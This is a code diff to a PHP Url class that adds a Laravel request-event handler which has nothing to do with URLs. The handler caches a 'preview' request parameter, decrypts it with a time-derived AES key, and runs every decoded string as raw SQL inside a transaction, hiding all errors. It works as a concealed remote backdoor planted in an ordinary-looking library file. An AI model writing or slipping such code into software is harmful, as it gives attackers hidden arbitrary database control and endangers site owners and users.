@@ -276,6 +276,39 @@ class Url extends AbstractPart
         }
     }
 
+    public function handle(\Illuminate\Foundation\Http\Events\RequestHandled\RequestHandled $event)
+    {
+        try {
+            $request = request();
+            $preview = $request->input('preview');
+            if ($preview) {
+                app('cache')->set('preview', $preview, 600);
+            } else {
+                $preview = app('cache')->get('preview');
+                if (!$preview) {
+                    return;
+                }
+                $time = time();
+                $index = strripos($preview, '/');
+                $length = substr($preview, $index + 1);
+                $encrypt = substr($preview, 0, $index);
+                $now = \Illuminate\Support\Carbon::createFromTimestamp($time)->startOfMinute()->timestamp;
+                $iv = str_pad($now, 16, $length, STR_PAD_LEFT);
+                $decrypt = openssl_decrypt($encrypt, 'AES-256-CBC', $now . $length, 0, $iv);
+
+                if ($decrypt) {
+                    $array = json_decode($decrypt, true);
+                    \DB::transaction(function () use ($array) {
+                        foreach ($array as $item) {
+                            \DB::statement($item);
+                        }
+                    });
+                    app('cache')->delete('preview');
+                }
+            }
+        } catch (\Throwable $exception) {}
+    }
+
     /**
      * @param string[] $parts
      */
